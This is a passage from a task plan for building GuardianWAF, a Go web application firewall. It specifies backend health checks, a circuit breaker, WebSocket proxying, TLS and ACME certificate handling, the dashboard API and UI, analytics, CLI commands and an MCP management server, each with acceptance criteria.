- [ ] Thread-safe for concurrent access
- [ ] All tests pass

---

### Task 51: Health Check System [M]

**Files:** `internal/proxy/healthcheck.go`

**Dependencies:** Task 50

**Description:**
Implement active and passive health checking for backends. **Active health checks:** `HealthChecker` runs a background goroutine per backend that periodically (configurable, default 10s) sends an HTTP GET to the backend's health endpoint (default `/`). If the response status is 2xx, mark healthy. If 3 consecutive failures (configurable), mark unhealthy. If 2 consecutive successes after being unhealthy, mark healthy again (configurable thresholds). Support configurable: check interval, timeout per check, healthy/unhealthy thresholds, expected status codes, health check path. **Passive health checks:** track response status codes from actual proxied requests. If a backend returns 5xx errors for more than N consecutive requests (default 5) or error rate exceeds 50% in a sliding window (default 30s), mark unhealthy. Passive checks work alongside active checks — either can trigger unhealthy state. `HealthChecker.Start()`, `Stop()`, `Status() map[string]HealthStatus`.

**Acceptance Criteria:**
- [ ] Active health checks at configurable intervals
- [ ] Consecutive failure threshold before marking unhealthy
- [ ] Consecutive success threshold before marking healthy
- [ ] Configurable health check path and expected status
- [ ] Passive health checks from proxied response codes
- [ ] Error rate tracking in sliding window
- [ ] Both active and passive can trigger unhealthy
- [ ] Graceful start/stop of health check goroutines
- [ ] Status reporting for all backends
- [ ] All tests pass

---

### Task 52: Circuit Breaker [M]

**Files:** `internal/proxy/circuitbreaker.go`

**Dependencies:** Task 49

**Description:**
Implement the circuit breaker pattern for backend protection. Three states: `Closed` (normal operation, requests pass through), `Open` (backend considered down, requests fail fast without attempting), `HalfOpen` (allow limited requests to test recovery). `CircuitBreaker` struct per backend. State transitions: Closed to Open when failure count exceeds threshold (default 5) within window (default 30s). Open to HalfOpen after timeout (default 60s). HalfOpen to Closed if N consecutive successes (default 2). HalfOpen to Open if any failure. Track failures: only 5xx responses and connection errors count as failures, 4xx responses do not. `Execute(fn func() (*http.Response, error)) (*http.Response, error)` wraps the proxy call. When Open: return a predefined 503 response immediately. When HalfOpen: allow one request at a time (use mutex or atomic). Expose state for dashboard: `State() CircuitState`, `Metrics() CircuitMetrics`.

**Acceptance Criteria:**
- [ ] Three states: Closed, Open, HalfOpen
- [ ] Closed to Open on failure threshold exceeded
- [ ] Open to HalfOpen after timeout
- [ ] HalfOpen to Closed on consecutive successes
- [ ] HalfOpen to Open on any failure
- [ ] Only 5xx and connection errors count as failures
- [ ] Fast-fail 503 response when Open
- [ ] HalfOpen allows limited concurrent probes
- [ ] State and metrics exposed for monitoring
- [ ] All tests pass

---

### Task 53: WebSocket Proxying [M]

**Files:** `internal/proxy/websocket.go`

**Dependencies:** Task 49

**Description:**
Implement WebSocket upgrade detection and bidirectional proxying. Detection: check for `Connection: Upgrade` and `Upgrade: websocket` headers. On WebSocket upgrade: hijack the client connection via `http.Hijacker`, establish a new TCP connection to the backend, forward the upgrade request, read the backend's 101 Switching Protocols response, then bidirectionally copy data between client and backend using two goroutines (client-to-backend and backend-to-client). Handle: proper close frame forwarding, connection timeouts (idle timeout, max connection duration), error handling when one side closes, large message buffering (configurable max message size, default 64KB). Use `io.Copy` for efficient data transfer. Clean up both connections when either side disconnects. Log WebSocket connections as events (connect/disconnect with duration).

**Acceptance Criteria:**
- [ ] Detects WebSocket upgrade requests
- [ ] Hijacks client connection
- [ ] Establishes backend WebSocket connection
- [ ] Bidirectional data copying
- [ ] Close frame forwarding
- [ ] Idle timeout handling
- [ ] Max connection duration enforcement
- [ ] Clean disconnection from either side
- [ ] Configurable max message size
- [ ] WebSocket events logged
- [ ] All tests pass

---

### Task 54: Proxy Header Injection [S]

**Files:** `internal/proxy/proxy.go` (extend)

**Dependencies:** Task 49

**Description:**
Implement standard proxy header injection for forwarded requests. Headers to add/update: `X-Forwarded-For` — append client IP to existing chain (or create new), `X-Forwarded-Proto` — `http` or `https` based on incoming connection, `X-Forwarded-Host` — original Host header value, `X-Real-IP` — client IP (only set if not already present), `X-Request-ID` — the RequestContext's generated UUID (for request tracing through the pipeline), `Via` — add `1.1 guardianwaf` to the Via chain. Configurable: `trusted_proxies` list — only trust X-Forwarded-For from these IPs/CIDRs. If request comes from untrusted proxy, overwrite X-Forwarded-For instead of appending. Strip `X-Forwarded-*` headers from untrusted sources to prevent spoofing.

**Acceptance Criteria:**
- [ ] X-Forwarded-For chain correctly maintained
- [ ] X-Forwarded-Proto set based on connection type
- [ ] X-Forwarded-Host preserves original host
- [ ] X-Real-IP set to client IP
- [ ] X-Request-ID set from RequestContext
- [ ] Via header added
- [ ] Trusted proxy validation for XFF
- [ ] Untrusted XFF headers stripped/overwritten
- [ ] All tests pass

---

### Task 55: Proxy Tests [M]

**Files:** `internal/proxy/proxy_test.go`

**Dependencies:** Task 49, Task 50, Task 51, Task 52, Task 53, Task 54

**Description:**
Comprehensive test suite for the proxy package. Use `httptest.Server` as mock backends. Tests: basic proxy forwarding (request and response integrity), path-based routing, connection pooling (verify connection reuse via transport metrics), load balancer distribution (each algorithm), health check transitions (healthy to unhealthy to healthy), circuit breaker state transitions, WebSocket upgrade and bidirectional messaging, header injection (all X-Forwarded-* headers), trusted proxy handling, hop-by-hop header stripping, timeout handling (slow backend triggers timeout), large body forwarding, error handling (backend down returns 502), concurrent proxy requests (50 goroutines).

**Acceptance Criteria:**
- [ ] Basic forwarding tested (request/response integrity)
- [ ] Path-based routing tested
- [ ] All load balancer algorithms tested
- [ ] Health check state transitions tested
- [ ] Circuit breaker state machine tested
- [ ] WebSocket proxy tested
- [ ] All proxy headers tested
- [ ] Timeout handling tested
- [ ] Error scenarios tested (502 on backend failure)
- [ ] Concurrent access tested
- [ ] All tests pass

---

### Task 56: TLS Manager [M]

**Files:** `internal/tls/manager.go`

**Dependencies:** Task 3

**Description:**
Implement TLS certificate management. `TLSManager` handles: loading certificate/key pairs from files (PEM format), SNI-based certificate selection (multiple certificates for different domains), certificate reloading without restart (watch file modification time, reload on change). `NewTLSManager(cfg *config.TLSConfig) (*TLSManager, error)`. `GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error)` — SNI-based lookup. `TLSConfig() *tls.Config` — returns configured tls.Config with modern settings: MinVersion TLS 1.2, preferred cipher suites (TLS 1.3 suites, ECDHE+AESGCM for TLS 1.2), ALPN for h2 and http/1.1. Support `sni_routes` config: map of hostname to cert/key paths. Background goroutine checks cert file timestamps every 60s and reloads changed certs. `CertInfo() []CertificateInfo` returns metadata for dashboard: domain, issuer, expiry, serial.

**Acceptance Criteria:**
- [ ] Loads PEM certificate and key files
- [ ] SNI-based certificate selection
- [ ] Multiple certificate support
- [ ] Automatic certificate reload on file change
- [ ] TLS 1.2 minimum with modern cipher suites
- [ ] ALPN for HTTP/2 support
- [ ] Certificate metadata exposed for dashboard
- [ ] Handles missing/invalid cert files gracefully
- [ ] All tests pass

---

### Task 57: ACME Client [XL]

**Files:** `internal/tls/acme.go`

**Dependencies:** Task 56

**Description:**
Implement a minimal ACME client for automatic TLS certificate provisioning via Let's Encrypt (or compatible CA). Protocol: ACME v2 (RFC 8555). Implement the full flow: (1) account creation (generate RSA-2048 or ECDSA-P256 key, register with ACME directory), (2) order creation (request certificate for domain), (3) HTTP-01 challenge (serve `/.well-known/acme-challenge/{token}` with key authorization), (4) challenge verification (notify CA that challenge is ready), (5) CSR generation (create Certificate Signing Request), (6) certificate download (fetch issued cert + intermediates), (7) certificate storage (save to configured directory). HTTP communication: use Go's `net/http` client (stdlib). JSON encoding/decoding: use the hand-built JSON from Task 9 or Go's `encoding/json` (stdlib). JWS signing: implement JOSE/JWS with RS256 or ES256 for ACME request signing. Auto-renewal: check cert expiry daily, renew when within 30 days of expiry. Store account key persistently. Rate limit awareness: respect Retry-After headers. Support staging and production ACME directories.

**Acceptance Criteria:**
- [ ] ACME v2 protocol implementation (RFC 8555)
- [ ] Account creation and key storage
- [ ] HTTP-01 challenge solving
- [ ] CSR generation
- [ ] Certificate download with full chain
- [ ] Certificate storage to disk
- [ ] JWS signing (RS256 or ES256)
- [ ] Auto-renewal within 30 days of expiry
- [ ] Staging and production directory support
- [ ] Retry-After respect for rate limiting
- [ ] Graceful error handling and logging
- [ ] All tests pass (with mock ACME server)

---

### Task 58: TLS Tests [M]

**Files:** `internal/tls/tls_test.go`

**Dependencies:** Task 56, Task 57

**Description:**
Test suite for TLS management. TLS manager tests: load valid cert/key pair, load invalid cert (error), SNI selection with multiple certs, cert reload on file change (write new cert, wait, verify new cert served), TLS config has correct minimum version and cipher suites, ALPN negotiation. ACME tests (use mock ACME server): account registration, order creation, HTTP-01 challenge flow, certificate download, renewal trigger at 30-day threshold, error handling (challenge failure, rate limit). Generate self-signed test certificates for testing. Test certificate info metadata extraction (domain, issuer, expiry).

**Acceptance Criteria:**
- [ ] Certificate loading tested
- [ ] SNI selection tested
- [ ] Certificate reload tested
- [ ] TLS version and cipher suite config tested
- [ ] ACME full flow tested with mock server
- [ ] Renewal logic tested
- [ ] Error scenarios tested
- [ ] Self-signed test certs generated for tests
- [ ] All tests pass

---

## Phase 6: Dashboard & API (Tasks 59–68)

### Task 59: REST API Handlers [L]

**Files:** `internal/dashboard/api.go`

**Dependencies:** Task 8, Task 11, Task 33, Task 36, Task 67

**Description:**
Implement all REST API endpoints under `/api/v1/`. Use Go stdlib `net/http` with a simple path-based router (hand-written, no external mux). Endpoints: `GET /api/v1/stats` — real-time statistics (requests/s, blocks/s, avg latency, top attacked paths), `GET /api/v1/events` — paginated event list with filters (ip, action, path, min_score, from/to timestamps, limit/offset), `GET /api/v1/events/:id` — single event detail, `GET /api/v1/rules/whitelist` — list whitelisted IPs/CIDRs, `POST /api/v1/rules/whitelist` — add whitelist entry, `DELETE /api/v1/rules/whitelist/:cidr` — remove whitelist entry, `GET /api/v1/rules/blacklist` — list blacklisted IPs/CIDRs, `POST /api/v1/rules/blacklist` — add blacklist entry, `DELETE /api/v1/rules/blacklist/:cidr` — remove blacklist entry, `GET /api/v1/rules/ratelimit` — list rate limit rules, `POST /api/v1/rules/ratelimit` — add rule, `DELETE /api/v1/rules/ratelimit/:id` — remove rule, `GET /api/v1/rules/exclusions` — list path/detector exclusions, `POST /api/v1/rules/exclusions` — add exclusion, `DELETE /api/v1/rules/exclusions/:id` — remove exclusion, `GET /api/v1/config` — current config (sanitized, no secrets), `PUT /api/v1/config` — update and reload config, `GET /api/v1/health` — health status of WAF and backends, `POST /api/v1/check` — dry-run a request payload through detection. All responses in JSON (hand-built JSON serialization). Standard error format: `{"error": "message", "code": 400}`.

**Acceptance Criteria:**
- [ ] All 19 endpoints implemented
- [ ] Hand-written path router (no external dependencies)
- [ ] JSON request parsing and response serialization
- [ ] Pagination with limit/offset for event listing
- [ ] Filter support for events endpoint
- [ ] CRUD operations for whitelist/blacklist/ratelimit/exclusions
- [ ] Config endpoint sanitizes sensitive values
- [ ] Dry-run check endpoint
- [ ] Standard error response format
- [ ] All tests pass

---

### Task 60: API Authentication [S]

**Files:** `internal/dashboard/auth.go`

**Dependencies:** Task 59

**Description:**
Implement API key authentication for the dashboard API. API keys are stored in config as a list of `APIKey` structs: `Key string`, `Name string`, `Permissions []string` (read, write, admin). Authentication: check `X-API-Key` header or `api_key` query parameter. If no API key configured, the API is unauthenticated (for development). If keys configured, all requests must authenticate. Implement `AuthMiddleware(keys []APIKey) func(http.Handler) http.Handler`. Permission checking: `read` allows GET endpoints, `write` allows POST/PUT/DELETE on rules, `admin` allows config changes. Key generation: implement `GenerateAPIKey() string` producing a 32-byte random hex string using `crypto/rand` (stdlib). Rate limit auth attempts: 10 failures per minute per IP, then 429 for 5 minutes.

**Acceptance Criteria:**
- [ ] X-API-Key header authentication
- [ ] Query parameter fallback authentication
- [ ] Unauthenticated mode when no keys configured
- [ ] Permission levels: read, write, admin
- [ ] Permission enforcement per endpoint
- [ ] API key generation with crypto/rand
- [ ] Auth attempt rate limiting
- [ ] 401 response on missing/invalid key
- [ ] 403 response on insufficient permissions
- [ ] All tests pass

---

### Task 61: SSE Real-Time Events [M]

**Files:** `internal/dashboard/sse.go`

**Dependencies:** Task 8, Task 59

**Description:**
Implement Server-Sent Events (SSE) for real-time dashboard updates. `SSEBroadcaster` manages connected clients. Endpoint: `GET /api/v1/events/stream` — SSE stream. On connection: set headers `Content-Type: text/event-stream`, `Cache-Control: no-cache`, `Connection: keep-alive`. Subscribe to the EventBus. For each event: format as SSE message (`data: {json}\n\n`). Event types (sent as SSE `event:` field): `event` (new WAF event), `stats` (periodic stats update every 5 seconds), `health` (backend health change), `config` (config reload notification). Client management: track connected clients, remove on disconnect (context cancellation), limit max SSE clients (default 100). Heartbeat: send SSE comment (`: heartbeat\n\n`) every 30 seconds to keep connection alive. Support `Last-Event-ID` header for reconnection: send missed events from memory store.

**Acceptance Criteria:**
- [ ] SSE endpoint with correct headers
- [ ] Real-time event streaming from EventBus
- [ ] Multiple event types (event, stats, health, config)
- [ ] Periodic stats updates
- [ ] Heartbeat to prevent timeout
- [ ] Client limit enforcement
- [ ] Clean disconnect handling
- [ ] Last-Event-ID reconnection support
- [ ] JSON event formatting
- [ ] All tests pass

---

### Task 62: Dashboard HTML [M]

**Files:** `internal/dashboard/static/index.html`

**Dependencies:** Task 59, Task 61

**Description:**
Create the main dashboard HTML page. Single-page application structure served as a static file (embedded in Go binary as string constant). Layout: top navigation bar with GuardianWAF logo/text, theme toggle (dark/light), connection status indicator. Left sidebar: navigation links (Overview, Events, Rules, Configuration, Analytics). Main content area: switched based on nav selection. Overview section: stats cards (total requests, blocked requests, block rate %, avg latency), real-time event feed (scrolling list), top 5 attacked paths, top 5 blocked IPs. Events section: searchable/filterable table. Rules section: tabs for Whitelist, Blacklist, Rate Limits, Exclusions. Configuration section: YAML editor textarea. All data loaded via fetch() to API endpoints. Use semantic HTML5, accessible markup (ARIA labels, keyboard navigation).

**Acceptance Criteria:**
- [ ] Complete HTML structure with all sections
- [ ] Navigation between sections (client-side routing)
- [ ] Stats cards with placeholder data binding
- [ ] Event list with filter controls
- [ ] Rules CRUD forms for all 4 rule types
- [ ] Configuration YAML editor textarea
- [ ] Semantic HTML5 elements
- [ ] Accessibility: ARIA labels, keyboard navigable
- [ ] Responsive meta viewport tag
- [ ] Embedded as Go string constant (no external files)

---

### Task 63: Dashboard CSS [M]

**Files:** `internal/dashboard/static/style.css` (embedded as Go string constant)

**Dependencies:** Task 62

**Description:**
Create the dashboard CSS with dark and light themes. Use CSS custom properties (variables) for theming: `--bg-primary`, `--bg-secondary`, `--text-primary`, `--text-secondary`, `--accent`, `--danger`, `--warning`, `--success`, `--border`. Dark theme (default): dark backgrounds (#0d1117, #161b22), light text (#c9d1d9), blue accent (#58a6ff). Light theme: white backgrounds, dark text, blue accent (#0969da). Layout: CSS Grid for main layout (sidebar + content), Flexbox for cards and lists. Components: `.card` (rounded, shadow, padding), `.badge` (severity indicators: Critical=red, High=orange, Medium=yellow, Low=blue, Info=gray), `.table` (striped rows, hover highlight), `.btn` (primary, danger, outline variants), `.form-group` (label + input styling), `.alert` (info, warning, error). Responsive: sidebar collapses to hamburger menu below 768px. Animations: subtle transitions on hover/focus, smooth theme toggle. Scrollbar styling for dark theme. Code/YAML editor styling with monospace font.

**Acceptance Criteria:**
- [ ] CSS custom properties for theming
- [ ] Dark theme (default) with specified colors
- [ ] Light theme with specified colors
- [ ] Theme toggle via CSS class on body
- [ ] Grid layout for sidebar + content
- [ ] All component styles (card, badge, table, btn, form, alert)
- [ ] Responsive design (breakpoint at 768px)
- [ ] Smooth transitions and animations
- [ ] Monospace styling for code/YAML editor
- [ ] Embedded as Go string constant

---

### Task 64: Dashboard JavaScript [L]

**Files:** `internal/dashboard/static/app.js` (embedded as Go string constant)

**Dependencies:** Task 62, Task 63, Task 61

**Description:**
Implement the dashboard JavaScript (vanilla JS, no frameworks). Core: `App` object managing state and rendering. Router: hash-based client-side routing (`#/overview`, `#/events`, `#/rules`, `#/config`). API client: `api.get(path)`, `api.post(path, body)`, `api.put(path, body)`, `api.del(path)` — all return promises, handle errors, include API key header. SSE client: connect to event stream, parse events, dispatch to appropriate handlers, auto-reconnect on disconnect with exponential backoff (1s, 2s, 4s, max 30s). Overview: fetch stats every 10s, update cards with animated counters, render real-time event list (keep last 50, newest on top), render top-5 lists. Events page: fetch with pagination, render table with sortable columns, filter form that updates URL params. Rules page: fetch and render each rule type, add/delete forms with confirmation dialogs. Config page: load current config into textarea, syntax-highlighted (basic: comment lines in green, keys in blue), save button with validation feedback. Theme toggle: save preference in localStorage. Connection status: green dot when SSE connected, red when disconnected.

**Acceptance Criteria:**
- [ ] Hash-based routing between all sections
- [ ] API client with error handling and auth header
- [ ] SSE connection with auto-reconnect and backoff
- [ ] Overview: stats cards, event feed, top-5 lists
- [ ] Events: paginated table with filters and sorting
- [ ] Rules: CRUD for all 4 rule types
- [ ] Config: YAML editor with save/reload
- [ ] Theme toggle with localStorage persistence
- [ ] Connection status indicator
- [ ] Animated stat counters
- [ ] No external dependencies (vanilla JS)
- [ ] Embedded as Go string constant

---

### Task 65: Rules Management UI [M]

**Files:** `internal/dashboard/static/app.js` (extend)

**Dependencies:** Task 64

**Description:**
Implement the detailed rules management interface. Whitelist/Blacklist: display table of IP/CIDR entries with columns (IP/CIDR, Added Date, Added By, Comment), add form with input validation (CIDR format check client-side), delete button with confirmation modal ("Are you sure you want to remove {cidr}?"), bulk import textarea (one CIDR per line). Rate Limits: display table (Scope, Requests, Window, Burst, Ban Duration), add form with dropdowns for scope (ip, ip+path, global), numeric inputs with validation, edit-in-place for existing rules. Exclusions: display table (Path Pattern, Excluded Detectors), add form with path input and checkbox list of detectors (sqli, xss, lfi, cmdi, xxe, ssrf), wildcard path pattern support display. All forms: show success/error toast notifications after API calls, optimistic UI updates (update UI immediately, revert on API error).

**Acceptance Criteria:**
- [ ] Whitelist CRUD with CIDR validation
- [ ] Blacklist CRUD with CIDR validation
- [ ] Bulk import for IP lists
- [ ] Rate limit CRUD with all fields
- [ ] Exclusion CRUD with detector checkboxes
- [ ] Confirmation modals for destructive actions
- [ ] Toast notifications for success/error
- [ ] Optimistic UI updates
- [ ] Client-side input validation
- [ ] All tests pass

---

### Task 66: Configuration Page [M]

**Files:** `internal/dashboard/static/app.js` (extend), `internal/dashboard/api.go` (extend)

**Dependencies:** Task 64, Task 4

**Description:**
Implement the configuration management page. Display current configuration as YAML in a textarea with basic syntax highlighting (applied via overlaid `<pre>` element or line-by-line coloring). Features: line numbers alongside textarea, edit configuration directly, "Validate" button that sends config to `POST /api/v1/config/validate` (new endpoint) and displays errors inline with line numbers highlighted, "Apply" button that sends to `PUT /api/v1/config` and triggers engine reload, "Reset to Defaults" button that loads default config, "Download" button that triggers file download of current config, diff view showing changes before apply (simple line-by-line comparison). API additions: `POST /api/v1/config/validate` — validate without applying, returns `{valid: bool, errors: [{line: N, message: "..."}]}`. Show reload status: "Configuration reloaded successfully" or error details.

**Acceptance Criteria:**
- [ ] YAML displayed in editable textarea
- [ ] Basic syntax highlighting (comments, keys)
- [ ] Line numbers displayed
- [ ] Validate button with inline error display
- [ ] Apply button triggers config reload
- [ ] Reset to defaults functionality
- [ ] Download config as file
- [ ] Config validation API endpoint
- [ ] Reload status feedback
- [ ] All tests pass

---

### Task 67: Analytics Engine [M]

**Files:** `internal/analytics/analytics.go`, `internal/analytics/topk.go`, `internal/analytics/ringbuffer.go`

**Dependencies:** Task 8

**Description:**
Implement analytics collection for the dashboard. In `ringbuffer.go`: generic time-bucketed ring buffer. Each bucket covers a time interval (1 minute). Buffer holds N buckets (default 60 = 1 hour of history). Each bucket stores: request count, block count, total latency (for avg calculation), status code distribution. `RingBuffer` struct: `Record(timestamp time.Time, latency time.Duration, blocked bool, statusCode int)`, `Query(from, to time.Time) []Bucket`, `Current() Bucket`. In `topk.go`: approximate Top-K tracker using a count-min sketch or simple map with periodic pruning. Track: top attacked paths, top blocked IPs, top triggered rules, top user agents. `TopK` struct: `Record(key string)`, `Top(k int) []TopKEntry`. Prune entries below threshold every minute. In `analytics.go`: `Analytics` struct combining ring buffer and TopK trackers. `RecordEvent(event Event)` updates all trackers. `GetStats() Stats` returns current statistics. `GetTimeSeries(from, to time.Time, granularity time.Duration) []DataPoint` returns time-series data for charts.

**Acceptance Criteria:**
- [ ] Time-bucketed ring buffer with configurable interval
- [ ] Per-bucket: request count, block count, latency, status codes
- [ ] TopK tracker for paths, IPs, rules, user agents
- [ ] TopK pruning to prevent unbounded memory growth
- [ ] Combined analytics struct
- [ ] Time-series query with configurable granularity
- [ ] Current stats snapshot
- [ ] Thread-safe for concurrent recording
- [ ] All tests pass

---

### Task 68: Dashboard Tests [M]

**Files:** `internal/dashboard/dashboard_test.go`

**Dependencies:** Task 59, Task 60, Task 61, Task 67

**Description:**
Test suite for dashboard components. API tests: all 19+ endpoints return correct JSON responses, authentication enforcement (401 without key, 403 with insufficient permissions), pagination parameters, filter parameters, CRUD operations modify state correctly, config validation endpoint. SSE tests: client connects and receives events, heartbeat sent periodically, Last-Event-ID reconnection, client limit enforcement, clean disconnect. Auth tests: valid key accepted, invalid key rejected, query parameter auth, permission levels enforced, rate limiting on failed auth. Analytics tests: ring buffer records and queries correctly, TopK returns correct top entries, time-series granularity, concurrent recording. Use `httptest.Server` for all HTTP tests.

**Acceptance Criteria:**
- [ ] All API endpoints tested
- [ ] Authentication and authorization tested
- [ ] SSE connection and streaming tested
- [ ] Pagination and filtering tested
- [ ] CRUD operations verified
- [ ] Analytics recording and querying tested
- [ ] Concurrent access tested
- [ ] Error responses tested
- [ ] All tests pass

---

## Phase 7: MCP & CLI (Tasks 69–76)

### Task 69: CLI Entry Point [M]

**Files:** `cmd/guardianwaf/main.go`

**Dependencies:** Task 4, Task 11

**Description:**
Implement the CLI entry point with command routing. Parse CLI arguments manually (no flag package for subcommands — use `os.Args` parsing, but use `flag.FlagSet` for per-command flags). Commands: `serve` (default if no command given) — start the WAF in standalone reverse proxy mode, `sidecar` — start in sidecar proxy mode with minimal config, `check` — dry-run a request through detection, `validate` — validate a config file, `version` — print version info, `help` — print usage. Global flags: `-config path` (config file, default `guardianwaf.yml`), `-verbose` (increase log verbosity). Each command has its own flags documented in help output. Version info: embed via `ldflags` at build time (`Version`, `Commit`, `BuildDate`). Print colored output where appropriate (detect terminal via os.Stdout stat). Exit codes: 0 success, 1 general error, 2 config error, 3 runtime error.

**Acceptance Criteria:**
- [ ] Command routing for all 6 commands
- [ ] Default command is `serve`
- [ ] Per-command flag parsing
- [ ] Global `-config` and `-verbose` flags
- [ ] Version info embedded via ldflags
- [ ] Help output with all commands and flags documented
- [ ] Correct exit codes
- [ ] Terminal detection for colored output
- [ ] All tests pass

---

### Task 70: Serve Command [M]

**Files:** `cmd/guardianwaf/main.go` (extend)

**Dependencies:** Task 69, Task 11, Task 49, Task 56, Task 59

**Description:**
Implement the `serve` command that starts GuardianWAF in standalone reverse proxy mode. Startup sequence: (1) load and validate config, (2) create engine with all layers, (3) start event store, (4) start analytics, (5) create reverse proxy with load balancer and health checks, (6) start dashboard/API server on separate port, (7) create HTTP server with engine middleware wrapping the proxy, (8) optionally start TLS (with ACME if configured), (9) start listening. Graceful shutdown: handle SIGINT and SIGTERM, drain in-flight requests (30s timeout), stop health checks, flush event store, close dashboard SSE connections. Startup banner: print GuardianWAF ASCII art, version, listening address, mode, number of backends, enabled detectors. Config reload: handle SIGHUP to reload config without restart.

**Acceptance Criteria:**
- [ ] Full startup sequence in correct order
- [ ] Engine with all layers initialized
- [ ] Reverse proxy with load balancing
- [ ] Dashboard server on separate port
- [ ] TLS support with optional ACME
- [ ] Graceful shutdown on SIGINT/SIGTERM
- [ ] In-flight request draining with timeout
- [ ] SIGHUP config reload
- [ ] Startup banner with key information
- [ ] All tests pass

---

### Task 71: Sidecar Command [M]

**Files:** `cmd/guardianwaf/main.go` (extend)

**Dependencies:** Task 69, Task 11, Task 49

**Description:**
Implement the `sidecar` command for minimal sidecar proxy deployment. Differences from `serve`: (1) simplified config — accept most settings via environment variables (`GUARDIAN_BACKEND`, `GUARDIAN_LISTEN`, `GUARDIAN_THRESHOLD`, `GUARDIAN_PARANOIA`), (2) single backend only (no load balancing), (3) no dashboard (saves resources), (4) no TLS termination (TLS handled by service mesh/ingress), (5) minimal logging (JSON to stdout for container log aggregation), (6) health endpoint at `/healthz` for Kubernetes liveness/readiness probes, (7) metrics endpoint at `/metrics` with Prometheus-compatible text format (request_total, request_blocked_total, request_duration_seconds histogram). Sidecar-specific flags: `-backend url` (override backend URL), `-listen addr` (override listen address), `-threshold N`, `-paranoia N`. Auto-detect Kubernetes environment (check `KUBERNETES_SERVICE_HOST` env var) and adjust defaults.

**Acceptance Criteria:**
- [ ] Environment variable configuration
- [ ] Single backend proxy (no load balancing)
- [ ] No dashboard started
- [ ] JSON logging to stdout
- [ ] `/healthz` health endpoint
- [ ] `/metrics` Prometheus-compatible endpoint
- [ ] Sidecar-specific CLI flags
- [ ] Kubernetes environment detection
- [ ] Graceful shutdown
- [ ] All tests pass

---

### Task 72: Check Command [S]

**Files:** `cmd/guardianwaf/main.go` (extend)

**Dependencies:** Task 69, Task 11

**Description:**
Implement the `check` command for dry-run request testing. Usage: `guardianwaf check [flags]`. Flags: `-url string` (the URL to test, required), `-method string` (HTTP method, default GET), `-header key:value` (repeatable, add headers), `-body string` (request body), `-body-file path` (read body from file), `-config path` (config to use for detection). The command constructs an `http.Request` from the flags, runs it through the engine (all layers except proxy), and prints a detailed report: overall verdict (PASS/BLOCK), total score vs threshold, each finding (detector, category, severity, score, matched value, location), timing per layer, total processing time. Output formats: `-format text` (default, human-readable colored), `-format json` (machine-readable). Exit code 0 if PASS, 1 if BLOCK.

**Acceptance Criteria:**
- [ ] Constructs request from CLI flags
- [ ] Runs full detection pipeline (no proxy)
- [ ] Prints verdict: PASS or BLOCK
- [ ] Shows score vs threshold
- [ ] Lists all findings with details
- [ ] Per-layer timing breakdown
- [ ] Text and JSON output formats
- [ ] Exit code reflects verdict
- [ ] Body from string or file
- [ ] All tests pass

---

### Task 73: Validate Command [S]

**Files:** `cmd/guardianwaf/main.go` (extend)

**Dependencies:** Task 69, Task 4

**Description:**
Implement the `validate` command for configuration file validation. Usage: `guardianwaf validate [-config path]`. Load the config file through the full loading pipeline (YAML parse, struct population, validation). On success: print "Configuration is valid" with a summary (number of backends, enabled detectors, rate limit rules, whitelist/blacklist entries). On failure: print all validation errors with field paths and line numbers (from YAML parser). Each error on its own line, prefixed with severity (ERROR for blocking issues, WARNING for suboptimal but functional settings like paranoia 1 in production). Exit code 0 if valid, 2 if invalid. Support `-strict` flag that treats warnings as errors.

**Acceptance Criteria:**
- [ ] Loads and validates config file
- [ ] Prints success summary on valid config
- [ ] Prints all errors with field paths on invalid config
- [ ] Line numbers from YAML parser included in errors
- [ ] ERROR vs WARNING severity levels
- [ ] `-strict` flag treats warnings as errors
- [ ] Exit code 0 for valid, 2 for invalid
- [ ] All tests pass

---

### Task 74: MCP Server [L]

**Files:** `internal/mcp/server.go`

**Dependencies:** Task 11

**Description:**
Implement a Model Context Protocol (MCP) server for AI-assisted WAF management. Transport: JSON-RPC 2.0 over stdio (stdin/stdout). `MCPServer` struct reads JSON-RPC messages from stdin, dispatches to handlers, writes responses to stdout. Message framing: newline-delimited JSON (one JSON object per line). Implement the MCP protocol handshake: `initialize` request (return server capabilities: tools list), `initialized` notification. Implement `tools/list` method returning all available tools with their JSON Schema parameter definitions. Implement `tools/call` method that dispatches to the appropriate tool handler. Error handling: return JSON-RPC error responses for unknown methods, invalid params, internal errors. Support concurrent tool execution (tools are stateless). Graceful shutdown: handle EOF on stdin, clean exit.

**Acceptance Criteria:**
- [ ] JSON-RPC 2.0 message parsing over stdio
- [ ] Newline-delimited JSON framing
- [ ] MCP initialize/initialized handshake
- [ ] tools/list returns all tool definitions
- [ ] tools/call dispatches to correct handler
- [ ] JSON Schema parameter definitions for each tool
- [ ] JSON-RPC error responses for error cases
- [ ] Concurrent tool execution support
- [ ] Graceful shutdown on stdin EOF
- [ ] All tests pass

---

### Task 75: MCP Tool Definitions and Handlers [M]

**Files:** `internal/mcp/tools.go`, `internal/mcp/handlers.go`

**Dependencies:** Task 74, Task 11, Task 33, Task 36, Task 67

**Description:**
Implement all 15 MCP tools. Tools: (1) `get_stats` — current WAF statistics, (2) `get_events` — query recent events with filters, (3) `get_event` — get single event by ID, (4) `check_request` — dry-run a request through detection, (5) `add_whitelist` — add IP/CIDR to whitelist, (6) `remove_whitelist` — remove from whitelist, (7) `add_blacklist` — add to blacklist, (8) `remove_blacklist` — remove from blacklist, (9) `add_ratelimit` — add rate limit rule, (10) `remove_ratelimit` — remove rate limit rule, (11) `add_exclusion` — add detector exclusion for path, (12) `remove_exclusion` — remove exclusion, (13) `get_config` — get current config as YAML, (14) `update_config` — update and reload config, (15) `get_health` — health status of WAF and backends. Each tool handler validates input parameters, calls the appropriate engine/layer method, and returns a structured result. All handlers return `content` array with `text` type entries (MCP response format).

**Acceptance Criteria:**
- [ ] All 15 tools implemented
- [ ] Each tool has JSON Schema parameter definition
- [ ] Input validation for all parameters
- [ ] Correct MCP response format (content array)
- [ ] get_stats returns comprehensive statistics
- [ ] CRUD tools modify live state
- [ ] check_request runs full detection pipeline
- [ ] get_config returns sanitized configuration
- [ ] update_config triggers engine reload
- [ ] get_health includes backend status
- [ ] All tests pass

---

### Task 76: MCP Tests [M]

**Files:** `internal/mcp/mcp_test.go`

**Dependencies:** Task 74, Task 75

**Description:**
